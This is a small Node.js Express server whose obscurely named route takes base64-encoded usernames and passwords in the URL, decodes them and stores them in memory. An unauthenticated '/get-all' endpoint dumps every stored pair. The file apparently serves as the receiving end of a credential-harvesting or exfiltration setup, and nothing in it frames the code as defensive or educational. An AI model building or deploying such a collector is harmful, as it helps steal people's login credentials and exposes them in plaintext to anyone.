const express = require("express");
const app = express();
let arrUser=[]
app.get("/abcdfe", (req, res) => {
    console.log('====================================');
    console.log({req:req.body});
    console.log('====================================');
    res.send("hello");
  });
  app.get("/abcdfe/:userName/:pass/YmtpbmQ", (req, res) => {
   if(req.params.userName&&req.params.pass)
    arrUser.push({
    userName:atob(req.params.userName),
    pass:atob(req.params.pass)
   })
    res.send({data:req.params.userName, status:200});
  });
  app.get("/get-all", (req, res) => {

     res.send({arrUser});
   });
  app.listen( process.env.PORT ||3002 , () => {
    // app.listen(3002, () => {
      console.log("listening on port", process.env.PORT || 3002);
});
    